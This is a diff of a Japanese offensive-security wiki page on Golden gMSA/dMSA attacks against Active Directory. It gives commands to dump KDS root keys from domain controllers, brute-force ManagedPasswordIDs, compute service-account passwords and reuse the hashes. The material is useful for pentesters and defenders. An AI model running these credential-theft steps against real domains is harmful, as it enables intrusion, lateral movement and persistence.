@@ -10,20 +10,19 @@ Windows管理サービスアカウント（MSA）は、パスワードを手動�
 1. **gMSA** – グループ管理サービスアカウント – `msDS-GroupMSAMembership`属性で承認された複数のホストで使用できます。
 2. **dMSA** – 委任管理サービスアカウント – gMSAの（プレビュー）後継で、同じ暗号技術に依存しながら、より細かい委任シナリオを可能にします。
 
-両方のバリエーションにおいて、**パスワードは**通常のNTハッシュのように各ドメインコントローラー（DC）に**保存されません**。代わりに、各DCは以下から現在のパスワードを**導出**できます：
+両方のバリエーションにおいて、**パスワードは**通常のNTハッシュのように各ドメインコントローラー（DC）に**保存されません**。代わりに、各DCは以下の情報から**現在のパスワードをその場で導出**できます：
 
-* フォレスト全体の**KDSルートキー**（`KRBTGT\KDS`） – ランダムに生成されたGUID名の秘密で、`CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`コンテナの下にあるすべてのDCに複製されます。
+* フォレスト全体の**KDSルートキー**（`KRBTGT\KDS`） – ランダムに生成されたGUID名のシークレットで、`CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`コンテナの下にあるすべてのDCに複製されます。
 * 対象アカウントの**SID**。
 * `msDS-ManagedPasswordId`属性に見つかるアカウントごとの**ManagedPasswordID**（GUID）。
 
-導出は次のようになります：`AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 最終的に**base64エンコード**され、`msDS-ManagedPassword`属性に保存される240バイトのブロブ。
+導出は次のようになります：`AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 最終的に**base64エンコード**された240バイトのブロブが`msDS-ManagedPassword`属性に保存されます。
 通常のパスワード使用中はKerberosトラフィックやドメインの相互作用は必要なく、メンバーホストは3つの入力を知っている限り、ローカルでパスワードを導出します。
 
 ## Golden gMSA / Golden dMSA攻撃
 
-攻撃者がすべての3つの入力を**オフライン**で取得できれば、**フォレスト内の任意のgMSA/dMSAの**有効な現在および将来のパスワードを計算でき、再度DCに触れることなく、以下を回避できます：
+攻撃者がすべての3つの入力を**オフライン**で取得できれば、**フォレスト内の任意のgMSA/dMSAの**ために**有効な現在および将来のパスワード**を計算でき、再度DCに触れることなく、以下を回避できます：
 
-* Kerberosの事前認証 / チケット要求ログ
 * LDAP読み取り監査
 * パスワード変更間隔（事前に計算できます）
 
@@ -31,11 +30,12 @@ Windows管理サービスアカウント（MSA）は、パスワードを手動�
 
 ### 前提条件
 
-1. **1つのDC**（またはエンタープライズ管理者）の**フォレストレベルの侵害**。`SYSTEM`アクセスで十分です。
+1. **1つのDC**（またはエンタープライズ管理者）の**フォレストレベルの侵害**、またはフォレスト内のDCの1つへの`SYSTEM`アクセス。
 2. サービスアカウントを列挙する能力（LDAP読み取り / RIDブルートフォース）。
 3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA)または同等のコードを実行するための.NET ≥ 4.7.2 x64ワークステーション。
 
-### フェーズ1 – KDSルートキーの抽出
+### Golden gMSA / dMSA
+##### フェーズ1 – KDSルートキーの抽出
 
 任意のDCからダンプ（ボリュームシャドウコピー / 生のSAM+SECURITYハイブまたはリモートシークレット）：
 ```cmd
@@ -45,16 +45,25 @@ reg save HKLM\SYSTEM  system.hive
 # With mimikatz on the DC / offline
 mimikatz # lsadump::secrets
 mimikatz # lsadump::trust /patch   # shows KDS root keys too
+
+# With GoldendMSA
+GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
+GoldendMSA.exe kds
+
+# With GoldenGMSA
+GoldenGMSA.exe kdsinfo
 ```
 `RootKey`（GUID名）とラベル付けされたbase64文字列は、後のステップで必要です。
 
-### フェーズ2 – gMSA/dMSAオブジェクトの列挙
+##### フェーズ 2 – gMSA / dMSAオブジェクトの列挙
 
 少なくとも`sAMAccountName`、`objectSid`、および`msDS-ManagedPasswordId`を取得します：
 ```powershell
 # Authenticated or anonymous depending on ACLs
 Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
 Select sAMAccountName,objectSid,msDS-ManagedPasswordId
+
+GoldenGMSA.exe gmsainfo
 ```
 [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) はヘルパーモードを実装しています:
 ```powershell
@@ -64,31 +73,29 @@ GoldendMSA.exe info -d example.local -m ldap
 # RID brute force if anonymous binds are blocked
 GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
 ```
-### フェーズ 3 – ManagedPasswordIDを推測/発見する（欠如している場合）
+##### フェーズ 3 – ManagedPasswordID を推測 / 発見する (欠落している場合)
 
-一部のデプロイメントでは、`msDS-ManagedPasswordId`をACL保護された読み取りから*削除*します。  
-GUIDは128ビットであるため、単純なブルートフォースは実行不可能ですが：
+一部のデプロイメントでは、`msDS-ManagedPasswordId` を ACL 保護された読み取りから *除去* します。  
+GUID は 128 ビットであるため、単純なブルートフォースは実行不可能ですが、次のことが言えます：
 
-1. 最初の**32ビット = アカウント作成のUnixエポック時間**（分単位の解像度）。
-2. その後に96ビットのランダムなビットが続きます。
+1. 最初の **32 ビット = アカウント作成の Unix エポック時間** (分単位の解像度)。
+2. 続いて 96 ビットのランダムなビット。
 
-したがって、**アカウントごとの狭い単語リスト**（±数時間）は現実的です。
+したがって、**アカウントごとの狭い単語リスト** (± 数時間) は現実的です。
 ```powershell
 GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
 ```
 ツールは候補パスワードを計算し、それらのbase64ブロブを実際の`msDS-ManagedPassword`属性と比較します – 一致が正しいGUIDを明らかにします。
 
-### フェーズ 4 – オフラインパスワード計算と変換
+##### フェーズ 4 – オフラインパスワード計算と変換
 
 ManagedPasswordIDが知られると、有効なパスワードは1コマンドの距離にあります:
 ```powershell
 # derive base64 password
-GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>
-
-# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
-GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
+GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
+GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
 ```
-結果として得られるハッシュは、**mimikatz**（`sekurlsa::pth`）や**Rubeus**を使用してKerberosの悪用に注入でき、ステルスな**横移動**と**持続性**を可能にします。
+結果として得られるハッシュは、**mimikatz**（`sekurlsa::pth`）や**Rubeus**を使用してKerberosを悪用するために注入でき、ステルスな**横移動**と**持続性**を可能にします。
 
 ## 検出と緩和
 
@@ -101,12 +108,14 @@ GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
 ## ツール
 
 * [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – このページで使用される参照実装。
+* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – このページで使用される参照実装。
 * [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`、`sekurlsa::pth`、`kerberos::ptt`。
 * [`Rubeus`](https://github.com/GhostPack/Rubeus) – 派生AESキーを使用したパス・ザ・チケット。
 
 ## 参考文献
 
-- [Golden dMSA – 委任されたマネージドサービスアカウントの認証バイパス](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [Golden dMSA – 委任された管理サービスアカウントの認証バイパス](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [gMSA Active Directory攻撃アカウント](https://www.semperis.com/blog/golden-gmsa-attack/)
 - [Semperis/GoldenDMSA GitHubリポジトリ](https://github.com/Semperis/GoldenDMSA)
 - [Improsec – Golden gMSA信頼攻撃](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)
 
